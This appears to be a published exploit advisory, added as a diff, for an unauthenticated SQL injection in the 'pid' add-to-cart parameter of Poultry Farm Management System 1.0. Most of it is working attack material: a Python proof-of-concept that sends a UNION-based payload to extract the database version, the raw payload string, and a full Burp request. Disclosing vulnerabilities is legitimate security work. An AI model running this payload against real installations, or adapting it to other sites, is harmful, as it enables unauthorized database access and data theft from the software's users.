@@ -1,0 +1,78 @@
+# Exploit Title: Poultry Farm Management System 1.0 - Unauthenticated SQL Injection in 'pid' Parameter of Add to Cart Functionality
+# Date: 13th July 2024
+# Exploit Author: Abhishek Morla (abhishekmorla)
+# Vendor Homepage: https://www.sourcecodester.com/php/15230/poultry-farm-management-system-free-download.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/Redcock-Farm.zip
+# Github - 
+# Category: Web Application
+# Version: 1.0
+# Tested on: Linux
+# Vulnerable endpoint: http://localhost/farm/sell_product.php?action=add&pid=1
+
+------------------------------------------------------------------------------------
+
+1. Description:
+----------------------
+
+This vulnerability allows an unauthenticated attacker to execute arbitrary SQL commands 
+via the 'pid' parameter in the Add to Cart functionality, potentially leading to unauthorized access and data manipulation.
+
+
+----------------------
+
+
+2. Proof of Concept:
+----------------------
+To print the version of the database
+
+```
+import requests
+import re
+# Define the target URL and payload
+url = "http://localhost/farm/sell_product.php?action=add&pid=1'+UNION+ALL+SELECT+CONCAT(0x616268697368656b6d6f726c613a3a3a,version()),NULL,NULL,NULL,NULL,NULL,NULL--+-"
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": "http://localhost",
+    "Connection": "close"
+}
+data = {
+    "quantity": "1"
+}
+
+# Make the POST request
+response = requests.post(url, headers=headers, data=data)
+
+# Check for the presence of the desired string in the response
+# Make the POST request
+response = requests.post(url, headers=headers, data=data)
+
+# Search for the desired string in the response
+pattern = r'abhishekmorla:::.*?(?=\])'
+match = re.search(pattern, response.text)
+
+# Print the result
+if match:
+    print(match.group(0))
+else:
+    print("Pattern not found in the response.")
+```
+
+3. Example payload:
+----------------------
+
+(Union based)
+
+1'+UNION+ALL+SELECT+CONCAT(0x616268697368656b6d6f726c613a3a3a,version()),NULL,NULL,NULL,NULL,NULL,NULL--+-
+
+4. Burpsuite request:
+----------------------
+POST /farm/sell_product.php?action=add&pid=1'+UNION+ALL+SELECT+CONCAT(0x616268697368656b6d6f726c613a3a3a,version()),NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Origin: http://localhost
+Connection: close
+
+quantity=1
